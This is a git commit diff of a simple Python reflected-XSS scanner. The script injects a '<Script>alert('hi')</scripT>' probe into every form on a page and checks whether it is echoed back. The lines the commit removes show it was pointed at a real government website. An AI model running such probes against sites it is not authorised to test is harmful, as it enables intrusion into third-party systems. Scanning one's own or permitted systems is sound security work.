7b578f359f1f8010e1eae47e3765b1176e49581c
Keith Chin <info.chin.keith@gmail.com>
2021-04-06 13:32:52 +0800

    xss

--- xss.py
+++ xss.py
@@ -1,10 +1,9 @@
 import requests
-from pprint import pprint
 from bs4 import BeautifulSoup as bs
 from urllib.parse import urljoin
 
 
-def get_all_forms(url):
+def retrieveForms(url):
     soup = bs(requests.get(url).content, "html.parser")
     return soup.find_all("form")
 
@@ -16,10 +15,10 @@ def get_form_details(form):
     method = form.attrs.get("method", "get").lower()
 
     inputs = []
-    for input_tag in form.find_all("input"):
-        input_type = input_tag.attrs.get("type", "text")
-        input_name = input_tag.attrs.get("name")
-        inputs.append({"type": input_type, "name": input_name})
+    for tag in form.find_all("input"):
+        inputType = tag.attrs.get("type", "text")
+        inputName = tag.attrs.get("name")
+        inputs.append({"type": inputType, "name": inputName})
 
     details["action"] = action
     details["method"] = method
@@ -27,7 +26,7 @@ def get_form_details(form):
     return details
 
 
-def submit_form(form_details, url, value):
+def submitForm(form_details, url, value):
 
     target_url = urljoin(url, form_details["action"])
     inputs = form_details["inputs"]
@@ -36,11 +35,11 @@ def submit_form(form_details, url, value):
 
         if input["type"] == "text" or input["type"] == "search":
             input["value"] = value
-        input_name = input.get("name")
-        input_value = input.get("value")
-        if input_name and input_value:
+        inputName = input.get("name")
+        inputValue = input.get("value")
+        if inputName and inputValue:
 
-            data[input_name] = input_value
+            data[inputName] = inputValue
 
     if form_details["method"] == "post":
         return requests.post(target_url, data=data)
@@ -48,31 +47,25 @@ def submit_form(form_details, url, value):
         return requests.get(target_url, params=data)
 
 
-def scan_xss(url):
-    forms = get_all_forms(url)
+def findXSS(url):
+    forms = retrieveForms(url)
     print(f"[+] Detected {len(forms)} forms on {url}.")
-    js_script = "<Script>alert('hi')</scripT>"
+    script = "<Script>alert('hi')</scripT>"
 
     is_vulnerable = False
 
     for form in forms:
-        form_details = get_form_details(form)
-        content = submit_form(form_details, url, js_script).content.decode()
-        if js_script in content:
+        details = get_form_details(form)
+        content = submitForm(details, url, script).content.decode()
+        if script in content:
             print(f"[+]XSS Detected on {url}")
             print(f"[*]Form details:")
-            print(form_details)
+            print(details)
             is_vulnerable = True
 
     return is_vulnerable
 
 
 if __name__ == "__main__":
-    url = "https://pdea.gov.ph/index.php?option=com_content&view=article&layout=edit&id=1575"
-    print(scan_xss(url))
-    a_session = requests.Session()
-    a_session.get('https://google.com/')
-    session_cookies = a_session.cookies
-    cookies_dictionary = session_cookies.get_dict()
-
-    print(cookies_dictionary)
+    url = ""
+    print(findXSS(url))
